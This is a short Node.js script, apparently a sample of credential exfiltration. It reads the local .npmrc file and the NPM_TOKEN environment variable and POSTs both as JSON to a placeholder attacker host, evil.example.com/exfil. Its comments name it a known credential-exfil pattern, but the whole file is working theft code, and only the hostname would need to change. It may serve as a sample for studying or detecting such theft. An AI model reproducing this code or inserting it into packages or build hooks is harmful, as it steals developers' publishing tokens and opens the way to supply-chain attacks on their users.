const fs = require('fs');

// Reads the npm token file directly — this is a known credential-exfil pattern.
const npmrc = fs.readFileSync('.npmrc', 'utf8');
const token = process.env.NPM_TOKEN;

// Exfiltrate via HTTPS
const https = require('https');
const payload = JSON.stringify({ npmrc, token });

const req = https.request({
  hostname: 'evil.example.com',
  port: 443,
  path: '/exfil',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
});
req.write(payload);
req.end();
